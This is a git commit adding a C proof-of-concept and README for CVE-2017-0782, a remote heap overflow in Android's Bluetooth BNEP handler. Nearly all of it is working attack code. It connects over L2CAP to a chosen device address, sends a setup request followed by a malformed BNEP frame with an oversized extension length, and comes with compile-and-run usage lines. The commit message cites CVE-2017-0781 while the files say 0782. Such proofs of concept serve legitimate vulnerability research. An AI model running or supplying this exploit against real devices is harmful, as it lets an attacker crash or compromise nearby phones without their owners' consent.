marsyy__littl_tools
commit e30bde0aaf6dcd590e4004b1b894268243a87cc1
Author:     daiyang <406555789@qq.com>
AuthorDate: Tue Sep 26 05:35:44 2017 -0400
Commit:     daiyang <406555789@qq.com>
CommitDate: Tue Sep 26 05:35:44 2017 -0400

    Develop | Add poc for CVE-2017-0781
    
    Signed-off-by: daiyang <406555789@qq.com>

diff --git a/bluetooth/CVE-2017-0782/CVE-2017-0782-PoC.c b/bluetooth/CVE-2017-0782/CVE-2017-0782-PoC.c
new file mode 100644
index 0000000..7cefc19
--- /dev/null
+++ b/bluetooth/CVE-2017-0782/CVE-2017-0782-PoC.c
@@ -0,0 +1,178 @@
+//copyright @
+//huahuaisadog@gmail.com
+
+/***
+***Only for android devices***
+usage:
+$ gcc -o test CVE-2017-0782-PoC.c -lbluetooth
+$ sudo ./test TARGET_ADDR
+***/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>          
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <errno.h>
+#include <bluetooth/bluetooth.h>
+#include <bluetooth/l2cap.h>
+
+#define __u8 unsigned char
+#define __le16 unsigned short
+#define __le32 unsigned int
+#define __u16 unsigned short
+
+
+static int l2cap_set_mtu(int sock_fd, __le16 imtu, __le32 omtu) {
+	int ret;
+	struct l2cap_options option_arg;
+	socklen_t len ;
+	memset(&option_arg, 0 ,sizeof(option_arg));
+
+	ret = getsockopt(sock_fd, SOL_L2CAP, L2CAP_OPTIONS, &option_arg, &len);
+	if(ret == -1){
+		perror("[-]getsockopt failed : ");
+		return -1;
+	}
+
+	option_arg.imtu = imtu;
+	option_arg.omtu = omtu;
+
+	ret = setsockopt(sock_fd, SOL_L2CAP, L2CAP_OPTIONS, &option_arg, sizeof(option_arg));
+	if(ret == -1){
+		perror("[-]setsockopt failed : ");
+		return -1;
+	}
+	return 0;
+}
+#define BNEP_FRAME_CONTROL 0x01
+#define BNEP_SETUP_CONNECTION_REQUEST_MSG 0x01
+#define BNEP_FRAME_COMPRESSED_ETHERNET 0x02
+
+static int parse_fack_bnep_req(void *buffer, int data_len, void *data){
+	__u8 type = BNEP_FRAME_COMPRESSED_ETHERNET;
+	__u8 extension_present = 1;
+	__u16 protocal = 0x1;
+	__u8 ext_type = 0;
+	__u8 ext_len;
+
+	type = (extension_present << 7) | type;
+
+	memcpy(buffer, &type, 1);
+	memcpy(buffer + 1, &protocal, 2);
+	memcpy(buffer + 3, &ext_type, 1);
+	ext_len = data_len + 2;
+	memcpy(buffer + 4, &ext_len, 1);
+	memcpy(buffer + 5, data, data_len);
+
+	return data_len + 4;
+}
+
+static int parse_correct_bnep_req(void *buffer, int data_len, void *data){
+	__u8 type = BNEP_FRAME_CONTROL;
+	__u8 extension_present = 1;
+	__u8 ctrl_type = BNEP_SETUP_CONNECTION_REQUEST_MSG;
+	__u8 len = 2;
+
+	type = (extension_present << 7) | type;
+
+	memcpy(buffer, &type, 1);
+	memcpy(buffer + 1, &ctrl_type, 1);
+	memcpy(buffer + 2, &len, 1);
+	memcpy(buffer + 3, data, data_len);
+
+	return data_len + 3;
+}
+
+static int send_bnep_req(int sock_fd) { 
+	void *buffer;
+	int total_len;
+	buffer = malloc(0x100);
+	memset(buffer, 0, 0x100);
+
+	total_len = parse_fack_bnep_req(buffer, 0x8, "AAAAAAAAAAAAAAAAAAAAAAAA");
+
+	send(sock_fd, buffer, total_len, 0);
+	free(buffer);
+}
+
+static int send_first_bnep_req(int sock_fd) {
+	void *buffer;
+	int total_len;
+	buffer = malloc(0x100);
+	memset(buffer, 0, 0x100);
+
+	total_len = parse_correct_bnep_req(buffer, 0x4, "\x11\x15\x11\x15");
+
+	send(sock_fd, buffer, total_len, 0);
+	free(buffer);
+}
+
+int main(int argc ,char* argv[]){
+	int sock_fd, ret;
+	int i;
+	__le16 cont_offset;
+	void *buf, *data, *recv_buf;
+	int leak_req_count;
+	char dest[18];
+	struct sockaddr_l2 local_l2_addr;
+	struct sockaddr_l2 remote_l2_addr;
+	int retry_count = 20;
+	if(argc != 2){
+		printf("usage : sudo ./test TARGET_ADDR\n");
+		return -1;
+	}
+	strncpy(dest, argv[1], 18);
+	//char dest[18] = "48:db:50:02:c6:71";  //aosp angler
+	//char dest[18] = "dc:a9:04:86:45:cc";   // macbookpro
+	//char dest[18] = "00:1A:7D:DA:71:14"; //linux
+	// = "00:1a:7d:da:71:13"; //panyu
+	while(retry_count-- > 0){
+
+		sock_fd = socket(PF_BLUETOOTH, SOCK_STREAM, BTPROTO_L2CAP);
+		if(sock_fd == -1){
+			perror("[-]socket create failed : ");
+			return -1;
+		}
+
+		memset(&local_l2_addr, 0, sizeof(struct sockaddr_l2));
+		local_l2_addr.l2_family = PF_BLUETOOTH;
+		memcpy(&local_l2_addr.l2_bdaddr , BDADDR_ANY, sizeof(bdaddr_t));
+
+
+		ret = bind(sock_fd, (struct sockaddr*) &local_l2_addr, sizeof(struct sockaddr_l2));
+		if(ret == -1){
+			perror("[-]bind()");
+			goto next;
+		}
+
+		memset(&remote_l2_addr, 0, sizeof(remote_l2_addr));
+		remote_l2_addr.l2_family = PF_BLUETOOTH;
+		remote_l2_addr.l2_psm = htobs(0xF);
+		str2ba(dest, &remote_l2_addr.l2_bdaddr);
+
+		if(connect(sock_fd, (struct sockaddr *) &remote_l2_addr,sizeof(remote_l2_addr)) < 0) {  
+	  		perror("[-]Can't connect");  
+	  		if(errno == 110)
+	  			goto vul;
+			goto next;  
+		} 
+
+		sleep(1);
+
+		send_first_bnep_req(sock_fd);
+
+		
+		send_bnep_req(sock_fd);	
+	next:
+		close(sock_fd);
+	}
+	printf("[+]maybe not vulnerable\n");
+	return 0;
+vul:
+	close(sock_fd);
+	printf("[+]device is vulnerable\n");
+	return 0; 
+}
\ No newline at end of file
diff --git a/bluetooth/CVE-2017-0782/README b/bluetooth/CVE-2017-0782/README
new file mode 100644
index 0000000..6bee3e1
--- /dev/null
+++ b/bluetooth/CVE-2017-0782/README
@@ -0,0 +1,9 @@
+remote heap overflow for android devices with bluetooth open
+PoC for CVE-2017-0782
+
+/***
+***Only for android devices***
+usage:
+$ gcc -o test CVE-2017-0782.c -lbluetooth
+$ sudo ./test TARGET_ADDR
+***/
